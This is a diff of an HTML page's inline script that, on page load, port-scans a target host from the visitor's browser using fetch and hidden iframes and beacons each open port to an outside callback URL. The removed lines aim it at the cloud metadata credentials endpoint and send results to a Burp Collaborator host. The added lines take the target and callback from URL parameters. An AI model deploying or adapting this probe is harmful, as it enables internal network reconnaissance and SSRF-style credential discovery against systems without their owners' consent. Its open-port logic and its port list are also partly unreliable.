@@ -1,41 +1,76 @@
-
-    <script type="text/javascript">
-        async function scanPort(host, port) {
-            try {
-                let url = `http://${host}`;
-                await fetch(url, { mode: 'no-cors' });
+<script type="text/javascript">
+    async function scanPort(host, port) {
+        try {
+            let url = `https://${host}:${port}`;
+            let response = await fetch(url, { mode: 'no-cors' });
+            if (response.ok || response.type === 'opaque') {
                 console.log(`Port ${port} is open`);
                 sendPing(port);
                 return port;
-            } catch (error) {
-                return null; // Port is closed
             }
+            return null;
+        } catch (error) {
+            return scanPortWithIframe(host, port);
         }
+    }
 
-        async function scanPorts(host, ports) {
-            let openPorts = [];
-            for (let port of ports) {
-                let result = await scanPort(host, port);
-                if (result) {
-                    openPorts.push(result);
-                }
-            }
-            return openPorts;
-        }
+    function scanPortWithIframe(host, port) {
+        return new Promise((resolve) => {
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
 
-        function sendPing(port) {
-            let collaboratorUrl = 'https://v84btbg9pdpd2k1gkc7y5omkmbs2gy4n.oastify.com';
-            let pingUrl = `${collaboratorUrl}?port=${port}`;
-            let img = new Image();
-            img.src = pingUrl;
-            console.log(`Ping sent to ${pingUrl}`);
-        }
+            let timeout = setTimeout(() => {
+                document.body.removeChild(iframe);
+                resolve(null); // Port is closed or not serving HTTP content
+            }, 5000); // Timeout in milliseconds
 
-        document.addEventListener("DOMContentLoaded", function() {
-            let host = '169.254.169.254/latest/meta-data/iam/security-credentials/'; // Replace with your target host
-            let ports = [80, 443, 8080, 3000, 22, 21,378923]; // List of ports to scan
-            scanPorts(host, ports).then(openPorts => {
-                console.log("Open ports:", openPorts);
-            });
+            iframe.onload = function() {
+                clearTimeout(timeout);
+                console.log(`Port ${port} is open`);
+                sendPing(port);
+                document.body.removeChild(iframe);
+                resolve(port);
+            };
+
+            iframe.onerror = function() {
+                clearTimeout(timeout);
+                document.body.removeChild(iframe);
+                resolve(null); // Port is closed or not serving HTTP content
+            };
+
+            let url = `https://${host}:${port}`;
+            iframe.src = url;
+            document.body.appendChild(iframe);
         });
-    </script>
+    }
+
+    async function scanPorts(host, ports) {
+        let openPorts = [];
+        for (let port of ports) {
+            let result = await scanPort(host, port);
+            if (result) {
+                openPorts.push(result);
+            }
+        }
+        return openPorts;
+    }
+
+    function sendPing(port) {
+        let collaboratorUrl = new URLSearchParams(window.location.search).get('url');
+        let pingUrl = `${collaboratorUrl}?port=${port}`;
+        let img = new Image();
+        img.src = pingUrl;
+        console.log(`Ping sent to ${pingUrl}`);
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        let host = new URLSearchParams(window.location.search).get('host'); // Replace with your target host
+        let ports = [80, 443, 8080,8081,2873, 3000, 22, 21, 378923]; // List of ports to scan
+        scanPorts(host, ports).then(openPorts => {
+            console.log("Open ports:", openPorts);
+        });
+    });
+
+    
+</script>
+
